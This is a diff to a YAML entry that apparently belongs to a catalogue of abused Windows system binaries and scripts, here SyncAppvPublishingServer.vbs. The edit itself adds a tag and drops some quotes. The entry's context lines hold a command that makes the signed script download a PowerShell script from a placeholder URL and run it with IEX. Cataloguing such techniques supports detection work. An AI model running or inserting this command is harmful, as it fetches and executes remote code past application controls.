@@ -1,7 +1,7 @@
 ---
 Name: Syncappvpublishingserver.vbs
 Description: Script used related to app-v and publishing server
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
   - Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
@@ -11,6 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1216.002
     OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: PowerShell
 Full_Path:
   - Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
 Detection:
